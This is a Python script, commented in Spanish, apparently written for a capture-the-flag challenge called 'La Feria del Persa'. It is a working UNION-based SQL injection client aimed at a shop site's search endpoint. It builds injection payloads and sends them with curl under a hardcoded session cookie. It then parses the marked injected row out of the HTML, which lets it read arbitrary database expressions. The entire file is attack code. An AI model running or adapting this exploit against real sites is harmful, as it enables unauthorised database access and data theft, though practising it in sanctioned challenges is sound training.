#!/usr/bin/env python3
"""
Desafío «La Feria del Persa» — cliente de inyección SQL para el buscador.

Consulta original (aprox.):
    SELECT id, nombre, descripcion, precio, categoria
    FROM productos WHERE nombre LIKE '%<q>%'

La fila inyectada se marca con la cadena ZZZCAT en la columna 5 para poder
localizarla aunque el ORDER BY del sitio la mezcle con los productos reales.

Rendimiento de columnas observado:
    col1 -> imagen (no visible directamente)   col2 -> <h3> nombre
    col3 -> <p> descripcion                    col4 -> precio
    col5 -> categoria

Uso:
    python3 sqli.py "<expresion SQL>"      # expresión en la columna 2 (nombre)
    python3 sqli.py --col3 "<expr>"        # expresión en la columna 3
    python3 sqli.py --col4 "<expr>"
"""
import re
import subprocess
import sys
import urllib.parse
from html import unescape

COOKIE = "trama_session=Vgb10FPCRELz_F_vMBbmZuRHczUjV3V1DKFygYKh22mTBZdgeA-3Qsy5Sgd3RSKU"
BASE = "https://<host>"
MARCA = "ZZZCAT"


def consultar(expr: str, col: int = 2) -> dict:
    cols = ["1", "2", "3", "4", f"'{MARCA}'"]
    cols[col - 1] = expr
    payload = "' UNION SELECT " + ",".join(cols) + "-- -"
    url = f"{BASE}/buscar?q={urllib.parse.quote(payload)}"
    r = subprocess.run(["curl", "-s", "-m", "25", "-b", COOKIE, url], capture_output=True, text=True)
    html = r.stdout
    arts = re.findall(r'(?s)<article class="producto-card[^"]*">.*?</article>', html)
    art = next((a for a in arts if MARCA in a), None)
    if art is None:
        texto = re.sub(r"<[^>]+>", " ", html)
        texto = re.sub(r"\s+", " ", unescape(texto))
        return {"error": texto[-180:]}
    def g(pat):
        m = re.search(pat, art, re.S)
        return unescape(m.group(1)).strip() if m else ""
    return {
        "img": g(r'src="([^"]+)"'),
        "nombre": g(r"<h3>(.*?)</h3>"),
        "desc": g(r"<p>(.*?)</p>"),
        "precio": g(r'producto-precio">(.*?)<'),
        "categoria": g(r'producto-categoria">(.*?)<'),
    }


def valor(expr: str, col: int = 2) -> str:
    """Devuelve el valor de la expresión usando la columna indicada."""
    d = consultar(expr, col)
    if "error" in d:
        return "[ERROR] " + d["error"]
    if col == 3:
        return d["desc"]
    if col == 4:
        return d["precio"]
    return d["nombre"]


if __name__ == "__main__":
    col = 2
    args = sys.argv[1:]
    while args and args[0].startswith("--col"):
        col = int(args[0].replace("--col", ""))
        args = args[1:]
    expr = args[0] if args else "sqlite_version()"
    print(valor(expr, col))
